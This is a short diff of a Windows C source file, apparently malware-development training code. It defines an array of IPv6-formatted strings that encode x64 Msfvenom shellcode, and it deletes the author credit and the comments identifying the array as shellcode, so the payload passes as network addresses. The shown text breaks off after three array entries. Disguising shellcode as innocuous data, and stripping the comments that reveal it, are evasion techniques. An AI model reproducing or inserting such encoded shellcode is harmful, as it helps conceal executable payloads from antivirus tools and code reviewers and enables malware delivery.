@@ -1,11 +1,6 @@
-// @NUL0x4C | @mrd0x : MalDevAcademy
-
 #include <Windows.h>
 #include <stdio.h>
 #include <Tlhelp32.h>
-
-// Output using `HellShell.exe calc.bin ipv6`
-// Where calc.bin is Msfvenom's calc x64 shellcode
 
 char* Ipv6Array[] = {
 		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
